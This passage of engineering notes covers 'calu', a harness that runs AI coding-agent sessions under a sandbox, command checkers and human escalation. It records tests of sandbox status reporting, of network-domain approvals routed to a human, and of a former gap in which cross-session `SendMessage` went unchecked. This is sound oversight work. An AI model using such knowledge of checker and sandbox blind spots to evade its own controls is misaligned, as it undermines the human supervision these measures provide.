files will break it silently at build time. So the recipe and the CI job now exist (Q15), and
the choice of whether to publish the binary beside the wheel is the owner's, with the numbers in
hand instead of my guess.

**Verified in CI on both architectures** (2026-11-10, a manual run of `release.yml`): the
`binary` jobs build **and run** the result on `ubuntu-latest` and on `ubuntu-24.04-arm` --
65 MiB in 73 s for x86_64, 68 MiB in 91 s for arm64 -- and the `publish` job is skipped, because
only a tag publishes. REQUIREMENTS 3 is Linux, so those two are the architectures that matter; a
binary cannot be cross-built here, since the script runs what it builds.

The first manual run failed on both runners with "Permission denied": `core.fileMode` is false
in the maintainer's checkout, so `chmod +x` never reached git. `scripts/get-browser.sh` had the
same problem since it was added, and `docs/TESTING.md` tells people to run it directly.

**Re-run when** a dependency is added or pydantic-ai is updated -- that is what the `binary`
jobs of `release.yml` do on every tag. A manual run from the Actions tab checks the whole
workflow without releasing anything.

## What `claude sandbox status` can and cannot answer (Q1, 2026-11-10)

**Question.** The open half of Q1 is what `enableWeakerNestedSandbox` changes inside a
container, and the reason it stayed open was that measuring it seemed to need a logged-in
`claude` in that container. The CLI has `claude sandbox status`, which "prints the effective
sandbox posture ... as one JSON line" and needs neither a session nor a login, so it looked like
the cheap way in.

**Setup** (CLI 2.1.319). `claude sandbox status` in a throwaway directory whose
`.claude/settings.json` switches the sandbox on, with and without
`enableWeakerNestedSandbox`, on the host and in the `calu-dev-dev` image with default seccomp and
with `--security-opt seccomp=unconfined` -- four combinations -- plus a direct
`bwrap --unshare-user --unshare-pid --dev-bind / / true` in the container both ways.

**Observations.**

* The posture is **identical** in all four combinations: `enabled: true`,
  `unavailableReason: null`, `strictMode: false`, `filesystemPolicy: "strict"`. The flag changes
  nothing it reports.
* In the same container, `bwrap --unshare-user` really does fail under default seccomp ("No
  permissions to create new namespace") and works with `seccomp=unconfined`. So the posture
  command does **not** probe whether the kernel will allow the namespaces; it reports what the
  settings say and whether the dependencies are installed.
* It names a missing dependency only when the settings it reads switch the sandbox on: on the
  host, where socat is missing, the directory with the sandbox enabled reported "socat not
  installed", and the same command in calu's own checkout (no sandbox in its settings) reported
  nothing at all.
* It reads the **project's** settings files, and there is no `--settings` option, so it cannot
  be asked what calu's own sandbox settings would amount to.

**What follows.** `enableWeakerNestedSandbox` still needs a real tool call in a container, so
Q1's last line stays open -- but the cheap route is now a measured dead end instead of an
untried idea. One thing was worth taking from the command: `policyLocked`, a managed settings
policy that locks the posture, which would override what calu asks for and is invisible
otherwise. `calu doctor` now reports that and a reason the CLI gives against building a sandbox,
and stays quiet when the posture says nothing -- because silence there means nothing, and
calu's own `bwrap`/`socat` checks are the honest answer to whether the tools are present.

**Re-run when** the CLI gains a way to probe the namespaces (or a `--settings` option for this
command), which would make it a better preflight than calu's own checks.

## An unlisted domain asks rather than fails (Q5/D45, 2026-11-10)

**Question.** D45 made "proxy" with a starter allow list the default for a new project, and
stated its cost as "a task that needs an unlisted domain stops until someone adds it". That was
never measured, and the cost is the whole argument against the default.

**Setup** (`spikes/smoke_session.py <dir> --sandbox --allow pypi.org --resolve allow`, CLI
2.1.319, haiku, fake checkers, socat from `get-socat.sh`). The allow list holds `pypi.org` and
nothing else. Claude is asked to run two bounded curls and report their output: one to
`pypi.org/simple/`, one to `example.net`.

**Observations.**

| command | checkers | Claude Code's approval | result |
|---|---|---|---|
| `curl https://pypi.org/simple/` (listed) | PASS | nothing asked | ran, `200` |
| `curl https://example.net/` (**not** listed) | PASS | **asked for a confirmation**, reason `SandboxNetworkAccess` | escalated by calu; allowed by the operator; then ran, `200` |

So an unlisted domain does not fail: Claude Code asks, and because calu turns a confirmation
the harness asks for into an escalation whatever the checkers said (D38), a **human** decides
it. The second line is also D38 verified end to end through calu with the sandbox on, which
only the CLI-level spike had shown before.

**What follows.** The cost of the "proxy" default is smaller than D45 claimed, and the
protection is better than a failure would be: the allow list is a **don't-ask** list, not a
wall. A session that needs a domain nobody listed stops and says which domain it wants, a
person allows it in one command, and the task goes on -- no configuration change, no restart.
The allow list still matters, because without it every package install would wait for a human.

**Follow-up (same day, D60).** The escalation this produces said only
`*** escalation 1: SandboxNetworkAccess` and the generic sentence about no checker objecting --
not which domain, not which command. The SDK's permission context carries Claude Code's own
prompt sentence and calu was throwing it away; with that wired through, the same spike now
shows "Allow network connection to example.net?", which is what a person needs in order to
decide.

**Not measured**: whether an allowed confirmation is remembered for later requests to the same
domain within a session, and what the sandbox does when `allowed_domains` is empty and a
command tries the network (the empty case is "nothing reachable" by configuration, which
`calu.preflight` warns about).

**Re-run when** the CLI changes how the sandbox handles an unlisted domain -- the table's second
line is the one that matters.

## What `SendMessage` can reach, and why calu no longer needs to know

**Not measured.** The question is whether a headless session (`claude -p` through the Agent SDK,
which is how calu runs it) can deliver a `SendMessage` to another Claude Code session on the same
machine. The CLI documentation says the tool addresses teammates, subagents **and other local
sessions**, with the controls `crossSessionInbound = accept|hold|refuse`, deny rules for
`SendMessage` and `ListAgents`, and `isolatePeerMachines`; the relay spike only showed delivery to
a background subagent of the same session (`relay`, above).

Measuring it needs two sessions and a peer discovery that may behave differently under `-p`. It is
worth doing, but the gate no longer rests on the answer: calu routes a `SendMessage` whose target
is not one of the session's own subagents to the command checker (PLAN.md D69), so delivery to
another session is a judged step either way. Before that, the tool was unchecked on the stated
grounds that it "cannot reach anything outside this session", which the documentation contradicts.

**Re-run when** the CLI changes how sessions discover each other, or if a user reports a message
arriving in another session unasked -- and then check `tests/unit/test_session.py`
(`test_a_message_out_of_the_session_is_checked_but_a_relay_is_not`) still describes what happens.
